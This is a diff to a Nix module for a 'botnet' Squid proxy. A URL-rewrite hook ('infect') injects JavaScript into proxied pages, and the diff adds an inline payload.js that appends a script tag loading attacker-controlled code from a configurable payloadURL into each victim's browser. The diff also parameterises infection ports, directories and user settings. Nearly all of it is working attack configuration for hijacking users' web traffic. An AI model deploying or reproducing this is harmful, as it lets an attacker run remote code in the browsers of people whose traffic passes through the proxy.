@@ -1,18 +1,18 @@
+cfg@{
+  user,
+  group,
+  payloadURL,
+  proxyPort ? 3128,
+  infectionPort ? 13337,
+  infectionDir ? "/var/botnet/infection",
+  stateDir ? "/run/botnet",
+  logDir ? "/var/log/botnet",
+  adminAddr ? "foo"
+}:
+
 { pkgs, ... }:
 
 let
-
-  cfg = {
-    proxyPort = 3128;
-    controlPort = 1337;
-    infectionPort = 13337;
-    adminAddr = "foo";
-    infectionDir = "/var/botnet/infection";
-    stateDir = "/run/botnet";
-    logDir = "/var/log/botnet";
-    user = "botnet";
-    group = "botnet";
-  };
 
   configFile = pkgs.writeText "squid.conf" ''
     http_port ${toString cfg.proxyPort}
@@ -49,12 +49,11 @@ let
     url_rewrite_program ${infect}/infect
   '';
 
-
   infect = pkgs.stdenv.mkDerivation {
     name = "infect";
     exe = ''
       #!/bin/sh
-      export PAYLOAD=${./payload.js}
+      export PAYLOAD=${payload}
       export INFECTION_DIR=${toString cfg.infectionDir}
       export INFECTION_PORT=${toString cfg.infectionPort}
       exec ${pkgs.python3}/bin/python3 ${./infect.py}
@@ -67,20 +66,22 @@ let
     '';
   };
 
+  payload = builtins.toFile "payload.js" ''
+    (function(){
+      if (!window.__OWNED__) {
+          window.__OWNED__ = true;
+          var script = document.createElement('script');
+          script.setAttribute('src', '${cfg.payloadURL}');
+          document.getElementsByTagName('head')[0].appendChild(script);
+      }
+    })();
+  '';
+
 in {
 
   networking.firewall.allowedTCPPorts = [
-    80 cfg.proxyPort cfg.controlPort
+    80 cfg.proxyPort
   ];
-
-  users.extraUsers.botnet = {
-    group = "botnet";
-    uid = 1337;
-  };
-
-  users.extraGroups.botnet = {
-    gid = 1337;
-  };
 
   services.httpd = {
     enable = true;
